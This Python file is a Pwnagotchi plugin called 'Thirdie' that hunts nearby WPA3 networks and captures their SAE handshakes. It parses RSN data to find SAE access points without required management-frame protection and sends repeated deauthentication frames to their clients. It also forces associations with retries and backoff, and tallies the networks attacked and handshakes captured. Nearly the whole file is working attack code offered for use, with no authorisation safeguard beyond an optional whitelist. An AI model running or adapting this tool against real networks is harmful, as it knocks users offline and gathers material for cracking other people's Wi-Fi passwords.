import base64
import struct
import random
import time
import logging
import pwnagotchi.plugins as plugins
import pwnagotchi.ui.components as components
import pwnagotchi.ui.view as view
import pwnagotchi.ui.fonts as fonts

class Thirdie(plugins.Plugin):
    __author__ = "AlienMajik"
    __version__ = "1.1.1"
    __license__ = "GPL3"
    __description__ = "Targets WPA3 networks to capture SAE handshakes with smarter deauth handling, RSN parsing, retries, multi-target support, UI feedback, exponential backoff, handshake verification, and more."

    def __init__(self):
        self.running = False
        self.active_targets = set()  # Set to track active BSSID targets for multi-support
        self.handshake_captured = {}  # Per-BSSID flag for handshake obtained
        self.last_targeted = {}  # Track last attack time per BSSID
        self.stats = {'targets_attacked': 0, 'handshakes_captured': 0}  # Basic stats tracking
        logging.info("Thirdie plugin initialized.")

    def on_loaded(self):
        """Initialize plugin options with validation."""
        self.options['deauth_attempts'] = self.options.get('deauth_attempts', 10)  # Default 10 attempts
        self.options['target_ssid'] = self.options.get('target_ssid', None)  # Optional SSID filter
        self.options['cooldown'] = self.options.get('cooldown', 60)  # Cooldown in seconds
        self.options['min_rssi'] = self.options.get('min_rssi', -70)  # Min RSSI for targeting
        self.options['max_targets_per_update'] = self.options.get('max_targets_per_update', 3)  # Max APs per update
        self.options['retry_attempts'] = self.options.get('retry_attempts', 3)  # Retry attempts for assoc
        self.options['passive_fallback'] = self.options.get('passive_fallback', True)  # Enable passive fallback
        self.options['passive_wait'] = self.options.get('passive_wait', 30)  # Seconds for passive monitor
        self.options['exponential_backoff'] = self.options.get('exponential_backoff', True)  # Enable exponential backoff
        self.options['assoc_timeout'] = self.options.get('assoc_timeout', 5)  # Timeout for association attempts
        self.options['ui_update_interval'] = self.options.get('ui_update_interval', 10)  # UI update interval in seconds
        # New UI config options
        self.options['ui_position_x'] = self.options.get('ui_position_x', 0)  # Default X position
        self.options['ui_position_y'] = self.options.get('ui_position_y', 95)  # Default Y position
        ui_font_raw = self.options.get('ui_font', 'small')
        self.options['ui_font'] = ''.join(word.capitalize() for word in ui_font_raw.split('_'))  # e.g., 'small' -> 'Small'
        ui_label_font_raw = self.options.get('ui_label_font', 'bold_small')
        self.options['ui_label_font'] = ''.join(word.capitalize() for word in ui_label_font_raw.split('_'))  # e.g., 'bold_small' -> 'BoldSmall'
        self.options['ui_color'] = self.options.get('ui_color', 'black').upper()  # Default color (e.g., 'black' -> view.BLACK)
        # Validate options
        if self.options['deauth_attempts'] < 1:
            self.options['deauth_attempts'] = 1
            logging.warning("Thirdie: deauth_attempts set to minimum 1.")
        if self.options['cooldown'] < 10:
            self.options['cooldown'] = 10
            logging.warning("Thirdie: cooldown set to minimum 10 seconds.")
        if self.options['min_rssi'] > -50:
            self.options['min_rssi'] = -50
            logging.warning("Thirdie: min_rssi set to maximum -50 dBm.")
        if self.options['max_targets_per_update'] < 1:
            self.options['max_targets_per_update'] = 1
            logging.warning("Thirdie: max_targets_per_update set to minimum 1.")
        if self.options['retry_attempts'] < 1:
            self.options['retry_attempts'] = 1
            logging.warning("Thirdie: retry_attempts set to minimum 1.")
        if self.options['passive_wait'] < 10:
            self.options['passive_wait'] = 10
            logging.warning("Thirdie: passive_wait set to minimum 10 seconds.")
        if self.options['assoc_timeout'] < 1:
            self.options['assoc_timeout'] = 1
            logging.warning("Thirdie: assoc_timeout set to minimum 1 second.")
        if self.options['ui_update_interval'] < 5:
            self.options['ui_update_interval'] = 5
            logging.warning("Thirdie: ui_update_interval set to minimum 5 seconds.")
        # Validate UI options (fallback to defaults if invalid)
        if not hasattr(fonts, self.options['ui_font']):
            logging.warning(f"Thirdie: Invalid ui_font '{ui_font_raw}'. Falling back to 'Small'.")
            self.options['ui_font'] = 'Small'
        if not hasattr(fonts, self.options['ui_label_font']):
            logging.warning(f"Thirdie: Invalid ui_label_font '{ui_label_font_raw}'. Falling back to 'BoldSmall'.")
            self.options['ui_label_font'] = 'BoldSmall'
        if not hasattr(view, self.options['ui_color']):
            logging.warning(f"Thirdie: Invalid ui_color '{self.options['ui_color'].lower()}'. Falling back to 'BLACK'.")
            self.options['ui_color'] = 'BLACK'
        logging.info(
            f"Thirdie loaded with deauth_attempts={self.options['deauth_attempts']}, "
            f"target_ssid={self.options['target_ssid']}, cooldown={self.options['cooldown']}s, "
            f"min_rssi={self.options['min_rssi']}, max_targets={self.options['max_targets_per_update']}, "
            f"retry_attempts={self.options['retry_attempts']}, passive_fallback={self.options['passive_fallback']}, "
            f"exponential_backoff={self.options['exponential_backoff']}, "
            f"assoc_timeout={self.options['assoc_timeout']}, ui_update_interval={self.options['ui_update_interval']}, "
            f"ui_position=({self.options['ui_position_x']},{self.options['ui_position_y']}), "
            f"ui_font={self.options['ui_font'].lower()}, ui_label_font={self.options['ui_label_font'].lower()}, "
            f"ui_color={self.options['ui_color'].lower()}."
        )

    def on_ready(self, agent):
        """Signal plugin readiness and initialize UI components."""
        self.running = True
        self.agent = agent  # Store agent for UI updates
        logging.info("Thirdie: Agent ready. Hunting WPA3 targets.")
        self._update_ui("Ready. Hunting WPA3...")

    def on_wifi_update(self, agent, access_points):
        """Process Wi-Fi updates and target WPA3 APs."""
        if not self.running:
            return
        current_time = time.time()
        targets_attacked = 0
        whitelist = agent.config().get('main', {}).get('whitelist', [])  # Access main.whitelist
        for ap in access_points:
            if targets_attacked >= self.options['max_targets_per_update']:
                break  # Limit number of attacks per update
            ssid = ap.get('hostname', '<hidden>')
            bssid = ap['mac']
            encryption = ap.get('encryption', 'UNKNOWN')
            rssi = ap.get('rssi', 0)
            # Skip if in main.whitelist (BSSID or SSID)
            if bssid in whitelist or ssid in whitelist:
                logging.debug(f"Thirdie: Skipping whitelisted {ssid} ({bssid}).")
                continue
            # Skip if signal too weak
            if rssi < self.options['min_rssi']:
                logging.debug(f"Thirdie: Skipping {ssid} ({bssid}) - RSSI {rssi} < {self.options['min_rssi']}.")
                continue
            # Check for WPA3 or transition mode (preliminary)
            if 'WPA3' not in encryption and 'WPA2/WPA3' not in encryption:
                continue
            # Parse RSN for SAE confirmation and PMF
            rsn_b64 = ap.get('rsn', '')
            if rsn_b64:
                try:
                    rsn_bytes = base64.b64decode(rsn_b64)
                    if len(rsn_bytes) < 2:
                        continue
                    version, = struct.unpack('<H', rsn_bytes[0:2])
                    if version != 1:
                        continue
                    offset = 2
                    # Skip group cipher
                    if offset + 4 > len(rsn_bytes):
                        continue
                    offset += 4
                    # Pairwise cipher count and skip list
                    if offset + 2 > len(rsn_bytes):
                        continue
                    pairwise_count, = struct.unpack('<H', rsn_bytes[offset:offset+2])
                    offset += 2
                    if offset + 4 * pairwise_count > len(rsn_bytes):
                        continue
                    offset += 4 * pairwise_count
                    # AKM count
                    if offset + 2 > len(rsn_bytes):
                        continue
                    akm_count, = struct.unpack('<H', rsn_bytes[offset:offset+2])
                    offset += 2
                    # Check AKMs
                    if offset + 4 * akm_count > len(rsn_bytes):
                        continue
                    is_sae = False
                    for i in range(akm_count):
                        akm = rsn_bytes[offset:offset+4]
                        if akm == b'\x00\x0f\xac\x08':  # SAE AKM
                            is_sae = True
                        offset += 4
                    if not is_sae:
                        continue
                    # Check PMF capabilities
                    if offset + 2 <= len(rsn_bytes):
                        caps, = struct.unpack('<H', rsn_bytes[offset:offset+2])
                        pmf_required = bool(caps & 0x0080)  # Bit 7 for PMF required
                        pmf_capable = bool(caps & 0x0040)  # Bit 6 for PMF capable
                    else:
                        pmf_required = True  # Assume required for WPA3
                        pmf_capable = True
                except Exception as e:
                    logging.warning(f"Thirdie: RSN parsing failed for {bssid} - {str(e)}")
                    continue
            else:
                continue
            # Filter by target SSID if specified
            if self.options['target_ssid'] and ssid != self.options['target_ssid']:
                continue
            # Skip if recently targeted (within cooldown)
            last_time = self.last_targeted.get(bssid, 0)
            if current_time - last_time < self.options['cooldown']:
                logging.debug(f"Thirdie: Skipping {ssid} ({bssid}) - still in cooldown.")
                continue
            logging.info(f"Thirdie: Confirmed SAE target - SSID: {ssid}, BSSID: {bssid}, PMF Required: {pmf_required}, PMF Capable: {pmf_capable}, RSSI: {rssi}")
            self.active_targets.add(bssid)
            self.handshake_captured[bssid] = False
            self._try_deauth_and_sniff(agent, ap, pmf_required)
            self.last_targeted[bssid] = current_time
            targets_attacked += 1
            self.stats['targets_attacked'] += 1
            self._update_ui(f"Attacked: {self.stats['targets_attacked']}, Captured: {self.stats['handshakes_captured']}")

    def _try_deauth_and_sniff(self, agent, ap, pmf_required):
        """Attempt deauth (if applicable) and association to capture SAE handshake with retries and timeouts."""
        bssid = ap['mac']
        ssid = ap.get('hostname', '<hidden>')
        logging.info(f"Thirdie: Attacking {ssid} ({bssid}).")
        self._update_ui(f"Targeting: {ssid}")
        clients = ap.get('clients', [])
        # Deauth only if clients present and PMF not required
        if pmf_required:
            logging.info(f"Thirdie: PMF required for {ssid} ({bssid}). Skipping deauth.")
        elif clients:
            logging.info(f"Thirdie: {len(clients)} clients detected for {ssid}. Sending targeted deauths.")
            for client in clients:
                client_mac = client if isinstance(client, str) else client.get('mac')
                if client_mac:
                    for _ in range(self.options['deauth_attempts']):
                        success = False
                        for retry in range(3):  # Error resilience retries
                            try:
                                agent.run(f"wifi.deauth {bssid} {client_mac}")
                                logging.debug(f"Thirdie: Targeted deauth sent to {client_mac} on {bssid}")
                                success = True
                                break
                            except Exception as e:
                                logging.warning(f"Thirdie: Deauth failed on {client_mac} (retry {retry+1}/3) - {str(e)}")
                                time.sleep(0.2)
                        if not success:
                            logging.error(f"Thirdie: Deauth failed on {client_mac} after retries.")
                        time.sleep(random.uniform(0.1, 0.5))  # Randomized delay
        else:
            logging.info(f"Thirdie: No clients detected for {ssid} ({bssid}). Skipping deauth.")
        # Retry loop for association attempts with exponential backoff and timeout
        backoff_time = 1  # Initial backoff
        for attempt in range(self.options['retry_attempts']):
            success = False
            start_time = time.time()
            for retry in range(3):  # Error resilience retries
                try:
                    agent.run(f"wifi.assoc {bssid}", timeout=self.options['assoc_timeout'])
                    logging.info(f"Thirdie: Association attempted on {bssid} (attempt {attempt+1}/{self.options['retry_attempts']}). Sniffing for SAE handshake.")
                    success = True
                    break
                except TimeoutError:
                    logging.warning(f"Thirdie: Association timed out on {bssid} after {self.options['assoc_timeout']}s.")
                    break
                except Exception as e:
                    logging.warning(f"Thirdie: Association failed on {bssid} (retry {retry+1}/3) - {str(e)}")
                    time.sleep(0.2)
            if not success:
                logging.error(f"Thirdie: Association failed on {bssid} after retries.")
            time.sleep(random.uniform(1, 3))  # Give time for handshake exchange
            if self.handshake_captured.get(bssid, False):
                break
            if self.options['exponential_backoff']:
                time.sleep(backoff_time)
                backoff_time = min(backoff_time * 2, 10)  # Cap at 10s
        # Passive fallback if enabled and no handshake captured
        if self.options['passive_fallback'] and not self.handshake_captured.get(bssid, False):
            logging.info(f"Thirdie: Active triggering failed for {ssid} ({bssid}). Falling back to passive monitoring for {self.options['passive_wait']}s.")
            self._update_ui(f"Passive wait: {ssid}")
            time.sleep(self.options['passive_wait'])
        # Clean up for this target
        self.active_targets.discard(bssid)
        self.handshake_captured.pop(bssid, None)
        self._update_ui("Idle")

    def on_handshake(self, agent, filename, access_point, client_station):
        """Handle captured handshakes and verify if SAE."""
        bssid = access_point['mac']
        if bssid in self.active_targets:
            ssid = access_point.get('hostname', '<hidden>')
            # Basic verification: check if filename indicates SAE (assuming Pwnagotchi naming)
            if 'sae' in filename.lower():  # Simple check; enhance if needed
                logging.info(f"Thirdie: Captured SAE handshake from {ssid} in {filename}!")
                self.handshake_captured[bssid] = True
                self.stats['handshakes_captured'] += 1
                self._update_ui(f"Captured: {ssid}")
            else:
                logging.warning(f"Thirdie: Captured handshake from {ssid} but may not be SAE: {filename}")

    def _update_ui(self, message):
        """Update Pwnagotchi UI with plugin status."""
        if hasattr(self, 'agent'):
            try:
                ui_view = self.agent.view()
                if ui_view._state.get('thirdie_status') is None:
                    ui_view.add_element('thirdie_status', components.LabeledValue(
                        color=getattr(view, self.options['ui_color']),
                        label='WPA3:', value='',
                        position=(self.options['ui_position_x'], self.options['ui_position_y']),
                        label_font=getattr(fonts, self.options['ui_label_font'])
                    ))
                ui_view.set('thirdie_status', message)
                ui_view.update(force=True)
            except Exception as e:
                logging.warning(f"Thirdie: UI update failed - {str(e)}")

    def on_epoch(self, agent, epoch, epoch_data):
        """Periodic stats logging and UI update on epoch."""
        if epoch % self.options['ui_update_interval'] == 0:
            logging.info(f"Thirdie Stats: Targets attacked: {self.stats['targets_attacked']}, Handshakes captured: {self.stats['handshakes_captured']}")
            self._update_ui(f"A: {self.stats['targets_attacked']} C: {self.stats['handshakes_captured']}")

    def on_unload(self):
        """Clean up on unload."""
        self.running = False
        self.active_targets.clear()
        self.handshake_captured.clear()
        self.stats.clear()
        logging.info("Thirdie: Shutting down.")